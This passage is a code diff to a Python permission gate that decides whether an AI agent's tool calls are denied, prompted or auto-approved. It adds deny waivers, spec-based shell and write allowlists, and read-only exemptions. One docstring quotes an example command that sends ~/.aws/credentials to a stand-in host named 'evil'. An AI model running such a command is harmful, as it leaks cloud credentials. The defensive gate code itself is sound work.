@@ -17,17 +17,21 @@ it.
 
 from __future__ import annotations
 
+import os
 from collections.abc import Callable, Iterator, Sequence
 from typing import TYPE_CHECKING, Any
 
 if TYPE_CHECKING:
     from kiro_crew.hooks import (
         _GATE_TIER_KINDS,
+        _HOST_SEARCH_BUILTIN_TOOLS,
         _READ_ONLY_TOOL_KINDS,
+        KIRO_TOOL_ALIASES,
         GateRule,
         GateTier,
         HookManager,
         HooksConfig,
+        SpecBuiltinAllow,
         ToolCall,
         ToolHookResult,
         _app_owns_mcp_server,
@@ -38,8 +42,10 @@ if TYPE_CHECKING:
         _is_declared_builtin_mcp_server,
         _is_deepseek_read_only_builtin,
         _is_first_party_app,
+        _is_first_party_read_only_mcp_tool,
         _is_harness_read_only_builtin,
         _is_host_read_only_builtin,
+        _is_host_search_builtin_call,
         _normalize_tool_name,
         _note_title_only_grant_pattern,
         _search_deny_target,
@@ -53,7 +59,9 @@ if TYPE_CHECKING:
         is_read_only_bash,
         is_sensitive_bash_command,
         is_unverifiable_path_refusal,
+        logger,
         mcp_identity_ref,
+        mcp_title_to_ref,
         policy_alias_split,
         policy_aliases,
         security,
@@ -95,6 +103,8 @@ class GateFacts:
         agent: str,
         app: str,
         classifier_only: bool,
+        trust_reads: bool = False,
+        deny_waivers: frozenset[str] = frozenset(),
     ) -> None:
         self.manager = manager
         self.call = call
@@ -102,6 +112,19 @@ class GateFacts:
         self.agent = agent
         self.app = app
         self.classifier_only = classifier_only
+        #: Refusal keys a person overrode on the dashboard approval card, for this
+        #: call or this session. Read by the deny-rules tier alone
+        #: (:func:`_tier_deny_rules`), which drops any key a governance policy
+        #: pins before it reaches ``is_denied``; no other tier consults it.
+        self.deny_waivers = deny_waivers
+        #: The surface's Reads approval mode is on for this call. Read by the
+        #: read-only tier alone (``_tier_read_only``), for the first-party MCP
+        #: proof; no deny tier, governance or grant tier consults it.
+        self.trust_reads = trust_reads
+        #: Why this call will ask when no row decides it, for the person who
+        #: answers the prompt. Set only by :func:`grant_spec_builtin`; the gate's
+        #: fall-through ``allow`` carries it as its reason. Never read to decide.
+        self.ask_note = ""
         self._memo: dict[str, Any] = {}
 
     def _once(self, key: str, compute: Callable[[], Any]) -> Any:
@@ -173,9 +196,9 @@ class GateFacts:
         ``is_shell``/``command``, so this can refuse a call but never grant one. A
         call that names its MCP server is left out: its ``command``-named arguments
         are not shell text, and it is governed by ``@server/tool`` rules. A harness
-        that names no server for its MCP calls (claude-agent-acp, opencode, dsh, pi)
-        cannot be told apart here, so such a call's ``command`` argument is checked
-        too.
+        that names no server for its MCP calls (opencode, dsh, pi, and claude-agent-acp
+        for a server Crew did not place) cannot be told apart here, so such a call's
+        ``command`` argument is checked too.
         """
 
         def compute() -> list[str]:
@@ -422,6 +445,42 @@ class GateFacts:
         """
         return mcp_identity_ref(self.call.mcp_server, self.call.mcp_tool)
 
+    @property
+    def governance_own_scopes(self) -> tuple[str, ...]:
+        """The scopes governance judges this call in, when that is proven.
+
+        ``("mcp",)`` for an MCP-served call, ``("tools", *row)`` for a host
+        built-in whose ``BUILTIN_TOOL_SCOPES`` row has no ``commands``, ``()``
+        otherwise (``gate_decision``'s ``own_scopes``). Proven only from the trusted identity
+        of a call the client did not classify as a shell call: the title and the
+        ACP ``kind`` are agent-influenced. A KAS id is read under the kiro-cli
+        names it may be admitted as, never a deny-only one, and every name with a
+        row must lack ``commands`` (``code`` keeps it). Enterprise only, so the
+        ``oss`` gate is unchanged.
+        """
+        from kiro_crew import edition
+        from kiro_crew.platform.governance import BUILTIN_TOOL_SCOPES
+
+        call = self.call
+        if (
+            not edition.is_enterprise()
+            or not call.identity_trusted
+            or call.identity_unreadable
+            or call.is_shell
+            or call.command is not None
+            or not call.mcp_tool
+        ):
+            return ()
+        if call.mcp_server:
+            return ("mcp",)
+        names = [_host_builtin_alias(call.mcp_tool, call.mcp_server) or call.mcp_tool]
+        if self.policy_alias_names:
+            names.extend(policy_alias_split(call.mcp_tool)[0])
+        rows = [BUILTIN_TOOL_SCOPES[name] for name in names if name in BUILTIN_TOOL_SCOPES]
+        if rows and all("commands" not in row for row in rows):
+            return ("tools", *dict.fromkeys(scope for row in rows for scope in row))
+        return ()
+
 
 # ── deny tiers ────────────────────────────────────────────────────────────────
 
@@ -557,7 +616,19 @@ def _rule_exfil(facts: GateFacts, target: str) -> str | None:
     dashboard count): auditing alone leaves a hijacked agent free to ``curl -d
     @~/.aws/credentials evil`` or open a reverse shell. Denied at the gate --
     against the raw command too, not just the title.
+
+    A host-trusted ``grep`` / ``glob`` built-in with no command line runs no shell,
+    so its only judged text is its title, the text it searches for: not read here.
     """
+    call = facts.call
+    if (
+        call.identity_trusted
+        and not call.mcp_server
+        and call.mcp_tool in _HOST_SEARCH_BUILTIN_TOOLS
+        and not call.command
+        and not facts.raw_shell_commands
+    ):
+        return None
     return audit_bash_exfiltration(target, enabled_ids=facts.enabled_ids)
 
 
@@ -687,16 +758,47 @@ def _tier_deny_rules(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
     the trusted identities. It reuses the ONE snapshot taken by the targets tier --
     a second read here would let a ceiling refresh split this call's verdict across
     two policy states.
+
+    A person's in-session overrides (:attr:`GateFacts.deny_waivers`) reach
+    ``is_denied`` only after every key a governance policy pins is dropped: the
+    active ceiling's pins and every loaded profile's
+    (``security.pinned_builtin_command_ids_for_snapshot``), so a pin that lands
+    mid-session, in the ceiling or in the bound profile, takes effect on the next
+    call even over a waiver granted before it. The union over-locks a profile
+    the session is not bound to, which only ever keeps a refusal. Every pattern
+    the companion ``SecurityOverlay`` adds (``authority.effective_patterns``) is
+    dropped the same way, and ``PolicyAuthority`` drops them once more itself.
     """
     authority = facts.authority
     denied_regexes = facts.denied_regexes
     denied_notes = facts.denied_notes
+    waived: frozenset[str] = frozenset()
+    if facts.deny_waivers:
+        from kiro_crew.security.deny_waiver import waivable_keys
+
+        try:
+            waived = waivable_keys(
+                facts.deny_waivers,
+                security.pinned_builtin_command_ids_for_snapshot(),
+                # The companion overlay's patterns are as hard as a pin.
+                authority.effective_patterns(),
+            )
+        except Exception:
+            # Pins or an overlay that cannot be read waive nothing: the override
+            # is the one input here that only ever loosens, so it is what a
+            # failure drops.
+            logger.warning(
+                "governance pins or security overlay unreadable; deny overrides ignored",
+                exc_info=True,
+            )
+            waived = frozenset()
     for target in facts.deny_targets:
         reason = authority.is_denied(
             target,
             facts.config.auto_deny_tools,
             denied_regexes=denied_regexes,
             reason_notes=denied_notes,
+            waived=waived,
         )
         if reason:
             return ToolHookResult.deny(reason)
@@ -730,6 +832,7 @@ def _tier_deny_rules(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
                 extra_patterns=sent_title_globs,
                 reason_notes=denied_notes,
                 segments=True,
+                waived=waived,
             )
             if reason:
                 return ToolHookResult.deny(reason)
@@ -738,8 +841,7 @@ def _tier_deny_rules(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
 
 def _tier_mcp_auto_deny(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
     """The operator's own ``auto_deny_tools`` GLOBS, and only those, against the
-    ``_meta.kiro`` server/tool identity (verified or not) in the ``@server/tool``
-    spelling the grant tier uses.
+    call's MCP identity in the ``@server/tool`` spelling the grant tier uses.
 
     Plus ``Running: @server/tool`` and the bare ``@server``, so a server-level rule
     binds to every tool. A user who writes both lists in one spelling --
@@ -750,13 +852,30 @@ def _tier_mcp_auto_deny(facts: GateFacts, tier: GateTier) -> ToolHookResult | No
     shell text, and running them over a synthesized reference is the accidental
     widening :attr:`GateFacts.governance_mcp_ref` forbids. Not gated on
     provenance: a deny can only ever deny.
+
+    The identity is the ``_meta.kiro`` server/tool pair when the call carries one
+    (verified or not). A call with no server whose title is ``mcp__<server>__<tool>``
+    -- the only place a harness that sends no ``_meta.kiro`` (claude) names its MCP
+    tool -- is read through ``mcp_title_to_ref``, the last-``__`` split the
+    governance ceilings use. That reading feeds this deny and nothing else: the
+    title is agent-influenced, so no grant tier ever sees it.
     """
     call = facts.call
-    if call.mcp_server and facts.config.auto_deny_tools:
+    if not facts.config.auto_deny_tools:
+        return None
+    if call.mcp_server:
         tool_ref = mcp_identity_ref(call.mcp_server, call.mcp_tool)
-        for ref in (tool_ref, f"Running: {tool_ref}", mcp_identity_ref(call.mcp_server, "")):
-            if ref and any(_tool_matches(pattern, ref) for pattern in facts.config.auto_deny_tools):
-                return ToolHookResult.deny(f"Blocked by security policy: {ref}")
+        server_ref = mcp_identity_ref(call.mcp_server, "")
+    elif facts.normalized.startswith("mcp__"):
+        tool_ref = mcp_title_to_ref(facts.normalized)
+        server_ref = tool_ref.partition("/")[0]
+        if server_ref == "@":
+            return None
+    else:
+        return None
+    for ref in (tool_ref, f"Running: {tool_ref}", server_ref):
+        if ref and any(_tool_matches(pattern, ref) for pattern in facts.config.auto_deny_tools):
+            return ToolHookResult.deny(f"Blocked by security policy: {ref}")
     return None
 
 
@@ -856,12 +975,20 @@ def _tier_governance(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
     elif alias and call.identity_trusted:
         alias_groups = ((call.mcp_tool, alias),)
     else:
+        from kiro_crew.platform.tool_names import is_harness_read_alias
+
         # claude states no _meta.kiro identity: its read built-in is named by
         # harness_builtin_tool, so a ceiling's deny on web_search binds it too.
+        # A title that is the harness's own name for that built-in (pi's
+        # ``read`` beside ``fs_read``) is the same ONE tool,
+        # asked as one identity as deepseek's is below; any other title is still
+        # asked on its own.
+        builtin = call.harness_builtin_tool
+        if not call.mcp_server and is_harness_read_alias(call.title, builtin):
+            alias_groups = ((call.title, builtin),)
+            builtin = ""
         identity = tuple(
-            name
-            for name in dict.fromkeys((call.mcp_tool, call.harness_builtin_tool))
-            if name and name != call.title
+            name for name in dict.fromkeys((call.mcp_tool, builtin)) if name and name != call.title
         )
         if alias:
             deny_aliases = (alias,)
@@ -875,6 +1002,11 @@ def _tier_governance(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
                 alias_groups = ((deepseek, deepseek_alias),)
             elif deepseek != call.title:
                 identity = (*identity, deepseek)
+    # A proven built-in is judged on its identity under ``tools``, so the identity
+    # is passed even when it equals the title (whose ``tools`` pair is then off-scope).
+    own_scopes = facts.governance_own_scopes
+    if "tools" in own_scopes and not alias_groups and call.mcp_tool not in identity:
+        identity = (*identity, call.mcp_tool)
     gov_reason = _governance_denial(
         facts.ctx,
         call.title,
@@ -889,13 +1021,14 @@ def _tier_governance(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
         alias_groups=alias_groups,
         deny_aliases=deny_aliases,
         spawn_target=call.spawn_target,
+        own_scopes=own_scopes,
     )
     if gov_reason:
         return ToolHookResult.deny_policy(gov_reason)
     return None
 
 
-# ── grant tiers (both skipped under ``classifier_only``) ──────────────────────
+# ── grant tiers (all skipped under ``classifier_only``) ───────────────────────
 
 
 def _tier_app_own_server(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
@@ -1081,6 +1214,388 @@ def _tier_operator_grants(facts: GateFacts, tier: GateTier) -> ToolHookResult | 
     return None
 
 
+def _spec_builtin_names(call: ToolCall) -> tuple[str, ...]:
+    """Every name a KAS built-in call answers to on the grant plane.
+
+    Its stamped id, kiro-cli's spelling of that id (``shell`` -> ``execute_bash``),
+    the kiro-cli policy names that are the SAME work (``read_file`` -> ``fs_read``),
+    and for a shell call both of KAS's shell tools. A deny-only alias is left out: ``delete_file`` is governed under
+    ``fs_write`` but a ``fs_write`` grant never mounted it, so it never approves it.
+    """
+    raw = call.mcp_tool
+    names = [raw, KIRO_TOOL_ALIASES.get(raw, raw)]
+    may_admit, _deny_only = policy_alias_split(raw)
+    names.extend(may_admit)
+    if "execute_bash" in names:
+        # KAS's one built-in alias pair: both shell tools reach the permission
+        # frame as ``run_command``, so a grant of either names this call.
+        names.append("execute_pwsh")
+    return tuple(dict.fromkeys(n for n in names if n))
+
+
+def _spec_command_granted(call: ToolCall, names: tuple[str, ...]) -> bool:
+    """Whether a spec's ``toolsSettings.shell.allowedCommands`` grants this call.
+
+    Only a shell call (kiro-cli's ``execute_bash`` among its names) with its
+    command recovered by the host and plain, or a chain of plain commands, each of
+    which one of ``spec_granted_commands`` matches whole
+    (:func:`_command_matches_any`), as kiro-cli anchors each entry at both ends. Each entry is read
+    by :mod:`kiro_crew.platform.allowed_commands`, which accepts only the syntax
+    both engines read alike and matches it in linear time; any other grants nothing.
+    """
+    if not call.spec_granted_commands or "execute_bash" not in names or not call.is_shell:
+        return False
+    return _command_matches_any(call.command, call.spec_granted_commands)
+
+
+def _spec_write_granted(call: ToolCall, names: tuple[str, ...]) -> bool:
+    """Whether a spec's write ``allowedPaths`` grants this call.
+
+    Only a file write (kiro-cli's ``fs_write`` among its names, so never a
+    deny-only alias such as ``delete_file``) whose every target one of
+    ``spec_granted_paths`` covers, as written and symlink-resolved
+    (:func:`_write_target_uncovered`, the ``spec-write-allowlist`` row's own
+    reading). A write whose targets cannot all be read grants nothing.
+    """
+    if not call.spec_granted_paths or "fs_write" not in names:
+        return False
+    candidates = edit_target_candidates(call.raw_params, call.diff_path, tool_kind=call.kind)
+    if candidates.truncated or candidates.unanchored or not candidates:
+        return False
+    return all(
+        _write_target_uncovered(target, call.spec_granted_paths, call.spec_write_cwd) is None
+        for target in candidates
+    )
+
+
+def _spec_command_composed(call: ToolCall, names: tuple[str, ...], patterns: Sequence[str]) -> bool:
+    """Whether a shell call is kept from *patterns* only by its shell composition
+    (:func:`kiro_crew.platform.allowed_commands.composition_blocks_match`). It only
+    explains a prompt or a refusal; it never grants."""
+    if not patterns or "execute_bash" not in names or not call.is_shell:
+        return False
+    from kiro_crew.platform import allowed_commands
+
+    return allowed_commands.composition_blocks_match(tuple(patterns), call.command)
+
+
+def _command_matches_any(command: str | None, patterns: Sequence[str]) -> bool:
+    """Whether *command* is plain
+    (:func:`kiro_crew.platform.allowed_commands.plain_command`: no redirect or
+    substitution character anywhere, no ``( ) { }`` outside a quoted argument), or
+    a chain of plain commands joined by ``&&``, ``||``, ``;`` or ``|``
+    (:func:`kiro_crew.platform.allowed_commands.chain_commands`), and one of
+    *patterns*, each read by :mod:`kiro_crew.platform.allowed_commands`, matches
+    EVERY command of it whole. ``None`` (no recovered command) matches nothing."""
+    from kiro_crew.platform import allowed_commands
+
+    return allowed_commands.chain_matches_all(tuple(patterns), command)
+
+
+def _tier_spec_shell_allowlist(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
+    """A spec's ``toolsSettings.shell.denyByDefault`` on a harness that does not
+    read it (KAS, claude): refuse an unlisted command.
+
+    On kiro-cli such a spec refuses every shell command its ``allowedCommands``
+    do not match. KAS and claude have no rule for it, so the KAS session handle and
+    the claude direct client stamp the spec's usable patterns on their own agent's
+    permission requests
+    (``AcpEvent.spec_shell_allowlist``; ``None`` when the spec does not set it, a
+    sub-session's or native KAS sub-agent's request carries ``None`` too, a native
+    claude sub-agent's the parent's), and this row
+    refuses a shell call (kiro-cli's ``execute_bash`` among its names, no MCP
+    server behind it) unless its recovered command passes the same match the
+    ``spec-builtin-grant`` row grants by (:func:`_spec_command_granted`: plain, or
+    a chain whose every command one pattern matches whole, :func:`_command_matches_any`). A deny, so it holds on every approval policy,
+    ``AUTO_APPROVE`` included, and whatever grant row would follow.
+
+    A ``deny_policy``: the refusal is the spec's state, not a defect in the call,
+    so it does not count toward a cron's auto-pause. It only ever refuses.
+    """
+    call = facts.call
+    allowlist = call.spec_shell_allowlist
+    if allowlist is None or call.mcp_server:
+        return None
+    if not call.is_shell and "execute_bash" not in _spec_builtin_names(call):
+        return None
+    if _command_matches_any(call.command, allowlist):
+        return None
+    if call.spec_shell_readonly and _command_is_read_only(call.command):
+        # `autoAllowReadonly: true`: kiro-cli runs a read-only command its
+        # allowlist does not match. It goes on to the rows below, where the
+        # read-only row answers it, and nothing a deny row refused comes back.
+        return None
+    if _spec_command_composed(call, ("execute_bash",), allowlist):
+        return ToolHookResult.deny_policy(
+            "Blocked by this agent's spec: toolsSettings.execute_bash.denyByDefault is set "
+            "and this command matches allowedCommands, but a chain (&&, ||, ;, |) matches only "
+            "when every command in it does and it holds no quote, backslash, non-ASCII "
+            "character or --%, and >, <, $() or backticks never match. "
+            "Run the script alone, or move the pipeline into the script."
+        )
+    return ToolHookResult.deny_policy(
+        "Blocked by this agent's spec: toolsSettings.execute_bash.denyByDefault is set "
+        "and the command matches none of its allowedCommands"
+    )
+
+
+def _command_is_read_only(command: str | None) -> bool:
+    """Whether *command* is one the read-only row answers: recovered, not running
+    git, and read-only by the bash classifier (:func:`_tier_read_only`)."""
+    if not command:
+        return False
+    return not command_invokes_git(command) and is_read_only_bash(command)
+
+
+def _is_spec_write_call(call: ToolCall) -> bool:
+    """Whether *call* is a file write of a KAS built-in: on the write plane
+    (:func:`is_edit_call`), or kiro-cli's ``fs_write`` among its names, deny-only
+    aliases included (KAS's ``delete_file``)."""
+    if is_edit_call(call.kind, call.diff_path):
+        return True
+    return "fs_write" in _spec_builtin_names(call) or "fs_write" in policy_aliases(call.mcp_tool)
+
+
+def _write_target_uncovered(target: str, patterns: Sequence[str], cwd: str) -> str | None:
+    """Why the write *target* is not covered by *patterns*, or ``None`` when it is.
+
+    ``~`` is expanded, as kiro-cli expands it, and a relative target is joined to
+    *cwd*, the session's own directory, which KAS resolves it against; with no
+    absolute *cwd* a relative target is not covered. Both the target as written
+    (normalized) and every symlink-resolved spelling of it must be covered, so a
+    link inside an allowed directory cannot carry the write out. The resolution
+    runs on the target before any ``..`` is folded, so ``link/..`` is followed the
+    way the filesystem follows it. Only when a spelling is not covered are the
+    entries' own directory parts resolved, as kiro-cli canonicalizes each entry,
+    so an entry written through a link still covers its real directory.
+    Resolution is bounded: one that does not complete, or fails, leaves the
+    target uncovered.
+    """
+    from kiro_crew.platform import allowed_paths
+    from kiro_crew.security.paths_resolver import PathResolutionStalled, _resolved_forms_bounded
+
+    expanded = os.path.expanduser(target)
+    if not os.path.isabs(expanded):
+        if not os.path.isabs(cwd):
+            return "it is a relative path and the session directory is unknown"
+        expanded = os.path.join(cwd, expanded)
+    lexical = os.path.normpath(expanded)
+    if not patterns:
+        return "none of its allowedPaths covers it"
+    try:
+        resolved = _resolved_forms_bounded(expanded)
+    except PathResolutionStalled:
+        return "its symlinks could not be resolved in time"
+    if not resolved:
+        return "its symlinks could not be resolved"
+    forms = [lexical, *sorted(resolved)]
+    uncovered = [form for form in forms if not allowed_paths.covered(patterns, form)]
+    if not uncovered:
+        return None
+    # The target may sit under an entry spelled through a symlink (the home
+    # directory, or a session directory reached through a link): kiro-cli
+    # canonicalizes each entry it builds, so the entries' directory parts are
+    # resolved too, here and only for a write the entries as written do not cover.
+    real_patterns: list[str] = list(patterns)
+    real_by_prefix: dict[str, set[str]] = {}
+    for pattern in patterns:
+        prefix = allowed_paths.literal_prefix_dir(pattern)
+        if prefix not in real_by_prefix:
+            try:
+                real_by_prefix[prefix] = _resolved_forms_bounded(prefix)
+            except PathResolutionStalled:
+                return "its allowedPaths' symlinks could not be resolved in time"
+        real_prefixes = real_by_prefix[prefix]
+        rest = pattern[len(prefix) :].lstrip("/")
+        for real in real_prefixes:
+            real = allowed_paths.to_glob_path(real)
+            if real == prefix or not allowed_paths.is_absolute(real):
+                continue
+            joined = allowed_paths.join(real, rest) if rest else real
+            twin = allowed_paths.anchor(joined, "", "")
+            if twin is not None:
+                real_patterns.append(twin)
+    if not allowed_paths.covered(real_patterns, lexical):
+        return "none of its allowedPaths covers it"
+    if not all(allowed_paths.covered(real_patterns, form) for form in uncovered):
+        return "it resolves through a symlink to a path none of its allowedPaths covers"
+    return None
+
+
+def _tier_spec_write_allowlist(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
+    """A spec's ``toolsSettings.fs_write.fallbackAction: "deny"`` on a harness that
+    does not read it (KAS, claude): refuse an uncovered write, a relative target
+    judged under ``spec_write_cwd``.
+
+    On kiro-cli such a spec refuses every file write its ``allowedPaths`` do not
+    cover, instead of asking. KAS and claude have no rule for it, so the KAS session
+    handle and the claude direct client stamp the spec's usable entries, anchored
+    at the session's directory, on their own agent's permission requests (``AcpEvent.spec_write_allowlist``; ``None`` when
+    the spec does not set it, and on a sub-session's or native KAS sub-agent's
+    request; a native claude sub-agent's carries the parent's), and this row refuses a file write (:func:`_is_spec_write_call`, no
+    MCP server behind it) unless every target it names is covered
+    (:func:`_write_target_uncovered`, matched by
+    :mod:`kiro_crew.platform.allowed_paths`). A write whose targets cannot all be
+    read (none named, a truncated walk, a relative diff path) is refused too. A
+    deny, so it holds on every approval policy, ``AUTO_APPROVE`` included.
+
+    A ``deny_policy`` like ``spec-shell-allowlist``: the refusal is the spec's
+    state, so it does not count toward a cron's auto-pause. It only ever refuses;
+    a covered write goes on to the rows below and still prompts.
+    """
+    call = facts.call
+    allowlist = call.spec_write_allowlist
+    if allowlist is None or call.mcp_server or not _is_spec_write_call(call):
+        return None
+    prefix = "Blocked by this agent's spec: toolsSettings.fs_write.fallbackAction is deny and "
+    candidates = edit_target_candidates(call.raw_params, call.diff_path, tool_kind=call.kind)
+    if candidates.truncated or candidates.unanchored or not candidates:
+        return ToolHookResult.deny_policy(prefix + "the write's target path could not be read")
+    for target in candidates:
+        why = _write_target_uncovered(target, allowlist, call.spec_write_cwd)
+        if why is not None:
+            return ToolHookResult.deny_policy(f"{prefix}{why}: {target}")
+    return None
+
+
+def _tier_spec_denies(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
+    """A KAS spec's checked ``deniedCommands`` / write ``deniedPaths``: refuse a call
+    of the session's own agent that one names, on every approval policy
+    (:mod:`kiro_crew.platform.spec_denied_gate`). Only ever refuses."""
+    from kiro_crew.platform.spec_denied_gate import spec_denies_refusal
+
+    reason = spec_denies_refusal(facts.call, _spec_builtin_names(facts.call))
+    return None if reason is None else ToolHookResult.deny_policy(reason)
+
+
+def _tier_spec_builtin_grant(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
+    """A KAS built-in the session's agent spec grants in ``allowedTools``.
+
+    On kiro-cli such a grant means no prompt. On KAS the projection keeps the shell
+    and filesystem families at ``ask`` (``kas_permissions.WITHHELD_FROM_AUTO_APPROVE``):
+    an allow rule would make KAS run the call without a permission request, so the
+    tiers above would never see it. Kept at ``ask``, every call reaches this gate,
+    and this row is Crew answering it on the spec's behalf.
+
+    Placed AFTER every deny tier and governance, so the deny floor, the
+    sensitive-path and write-protected checks and the governance ceiling have
+    already run and any of them still refuses. What this row adds is only the
+    grant, and only when all of these hold:
+
+    * not ``classifier_only``: like the other grant rows it vouches for the caller,
+      not for what the call does, so an unattended READ_ONLY surface ignores it;
+    * the call is a KAS built-in by HOST-TRUSTED identity -- ``kas_builtin_ids``,
+      ``identity_trusted``, a stamped tool id and no MCP server behind it -- never
+      by its model-authored title;
+    * one of :func:`_spec_builtin_names` is in ``spec_granted_builtins``, which the
+      session handle wrote from the batch it registered for the session's own
+      agent (a sub-session's request carries none);
+    * the governance ceiling in this judgement's own context snapshot has no
+      opinion on any of those names, and no configured profile could govern them
+      (``governance.may_grant_builtin_at_gate``, which fails closed), and no
+      operator ``confirm_tools`` pattern names the call. The projection asked the
+      same question once at session start; a ceiling installed since then
+      withholds the grant from the next call on.
+
+    A shell call reaches here only with its command recovered: the first row denies
+    one whose command it could not read. The surface's own checks that follow an
+    auto-approve (the name-grant shim, PreToolUse script hooks) still run.
+
+    The body is :func:`grant_spec_builtin` with no extra condition.
+    """
+    return grant_spec_builtin(facts)
+
+
+def grant_spec_builtin(
+    facts: GateFacts, *, allow: SpecBuiltinAllow | None = None
+) -> ToolHookResult | None:
+    """Crew's answer to a KAS permission request for a spec-granted built-in.
+
+    The shared helper for every grant Crew makes inside the gate on a KAS built-in
+    the policy kept at ``ask``. Called from a ``grant`` row, so every deny row and
+    governance have already run on the call; the conditions of
+    :func:`_tier_spec_builtin_grant` are checked here, and *allow*, when given, is
+    asked LAST with the facts and the call's names (:func:`_spec_builtin_names`).
+    It can only withhold: ``False`` (or an exception, which the gate's crash guard
+    turns into a refusal) leaves the call to the next row and the prompt. Returns
+    ``ToolHookResult.auto_approve()`` or ``None``.
+    """
+    if facts.classifier_only:
+        return None
+    call = facts.call
+    granted = call.spec_granted_builtins
+    if not (
+        granted or call.spec_granted_commands or call.spec_denied_grant or call.spec_granted_paths
+    ):
+        return None
+    if not call.kas_builtin_ids or not call.identity_trusted:
+        return None
+    if call.mcp_server or not call.mcp_tool:
+        return None
+    names = _spec_builtin_names(call)
+    from kiro_crew.platform.spec_denied_gate import denied_grant_applies
+
+    if (
+        not any(name in granted for name in names)
+        and not _spec_command_granted(call, names)
+        and not denied_grant_applies(call, names)
+        and not _spec_write_granted(call, names)
+    ):
+        if _spec_command_composed(call, names, call.spec_granted_commands):
+            from kiro_crew.platform.allowed_commands import COMPOSITION_NOTICE
+
+            facts.ask_note = COMPOSITION_NOTICE
+        return None
+    from kiro_crew.platform.governance import may_grant_builtin_at_gate
+
+    ceiling = getattr(facts.ctx, "governance", None)
+    if not all(may_grant_builtin_at_gate(name, ceiling) for name in names):
+        return None
+    if _operator_confirms(facts, names):
+        return None
+    if allow is not None and not allow(facts, names):
+        return None
+    return ToolHookResult.auto_approve()
+
+
+def _tier_batch_guard_grant(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
+    """A write-class MCP tool the agent spec auto-approves, which the batch write
+    guard kept at ``ask`` on KAS (``batch_guard.withhold_write_auto_approval``).
+
+    The guard runs inside ``approve_tool``, so a call the engine approves itself is
+    never judged. With the guard on, the projection gives each such write an
+    ``ask`` and records its ``@server/tool`` ref in ``spec_granted_builtins``; this
+    row answers the request it now raises, so the write still runs with no prompt,
+    and the transport's guard then refuses it only when it was batched with a read.
+
+    A ``grant`` row, after every deny tier and governance, and only when all hold:
+    not ``classifier_only``; the call's MCP identity is host-trusted; its
+    ``@server/tool`` ref is one the session's own projection recorded (a
+    sub-session's request carries none); the governance ceiling in this
+    judgement's context and every configured profile still let the ref skip the
+    gate (``governance.may_skip_gate``, ``any_configured_profile_governs``); and
+    no operator ``confirm_tools`` pattern names the call.
+    """
+    if facts.classifier_only:
+        return None
+    call = facts.call
+    if not call.identity_trusted or not call.mcp_server or not call.mcp_tool:
+        return None
+    ref = mcp_identity_ref(call.mcp_server, call.mcp_tool)
+    if not ref or ref not in call.spec_granted_builtins:
+        return None
+    from kiro_crew.platform.governance import may_skip_gate
+    from kiro_crew.platform.governance_profiles import any_configured_profile_governs
+
+    if not may_skip_gate(ref, getattr(facts.ctx, "governance", None)):
+        return None
+    if any_configured_profile_governs(ref):
+        return None
+    if _operator_confirms(facts, (ref,)):
+        return None
+    return ToolHookResult.auto_approve()
+
+
 # ── the classifier ────────────────────────────────────────────────────────────
 
 
@@ -1118,6 +1633,14 @@ def _tier_read_only(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
     ``kind="read"`` or titled ``Read …`` is not auto-approved; an MCP-served tool,
     which carries no host-trusted read-only marker, is not provable either. Off the
     flag the interactive path keeps its ACP-kind allow-list and title fallback.
+
+    One MCP identity IS a host-trusted marker, and only under the surface's Reads
+    approval mode (``GateFacts.trust_reads``): Kiro Crew's own read-only tools,
+    the exact ``(server, tool)`` pairs of ``_FIRST_PARTY_READ_ONLY_MCP_TOOLS``
+    carried with ``identity_trusted`` (``_is_first_party_read_only_mcp_tool``).
+    That proof runs after the confirm-list check and before the kind logic, so a
+    confirm-listed call still asks and the kind kiro-cli omits on an MCP frame
+    cannot refuse it.
     """
     call = facts.call
     # A session whose own approver must judge every read (heartbeat: no human behind
@@ -1151,6 +1674,22 @@ def _tier_read_only(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
             return ToolHookResult.auto_approve(read_only=True)
         return None
     from kiro_crew.slack.gateway import _is_read_only_tool
+
+    # Reads mode's one MCP proof: Kiro Crew's OWN read-only tools, named by the
+    # host-trusted ``(server, tool)`` pair (``_FIRST_PARTY_READ_ONLY_MCP_TOOLS``).
+    # Only when the surface said its Reads approval mode is on (``trust_reads``):
+    # under Normal the call still asks, and Trust / YOLO approve it on their own
+    # terms. Keyed on identity alone -- the ACP ``kind`` is not consulted because
+    # kiro-cli stamps none on an MCP tool_call frame, and the title never proves
+    # anything. Sits AFTER the confirm-list check above, so an operator who
+    # listed ``@kirocrew-core`` or the tool still gets the prompt, and after every
+    # deny tier and governance, so nothing a tier refused is re-admitted. The same
+    # tool name on another server, an untrusted identity, and every other
+    # ``kirocrew-core`` tool fall through unchanged.
+    if facts.trust_reads and _is_first_party_read_only_mcp_tool(
+        call.mcp_tool, call.mcp_server, mcp_identity_trusted=call.identity_trusted
+    ):
+        return ToolHookResult.auto_approve(read_only=True)
 
     kind = (call.kind or "").strip().lower()
     if facts.classifier_only:
@@ -1188,6 +1727,25 @@ def _tier_read_only(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
         ):
             return ToolHookResult.auto_approve(read_only=True)
         return ToolHookResult.allow()
+    # kiro-cli's file searches (``grep``, ``glob``, a read-only ``code`` lookup),
+    # proven by the host-stamped identity and the call's own arguments
+    # (``_is_host_search_builtin_call``): the kind kiro-cli stamps on them is
+    # ``search`` (or ``read`` on any ``code`` call, a rewrite too), so the kind
+    # allow-list below cannot tell them apart from a mutator. A kind that names a
+    # mutation still refuses, and an operator confirm pattern naming the call asks
+    # first. Every deny tier above, the sensitive-path keystone and the file-search
+    # deny target included, has already run.
+    if (
+        kind in ("", "search", "read")
+        and _is_host_search_builtin_call(
+            call.mcp_tool,
+            call.mcp_server,
+            call.raw_params,
+            mcp_identity_trusted=call.identity_trusted,
+        )
+        and not _operator_confirms(facts, (call.title, facts.normalized, call.mcp_tool))
+    ):
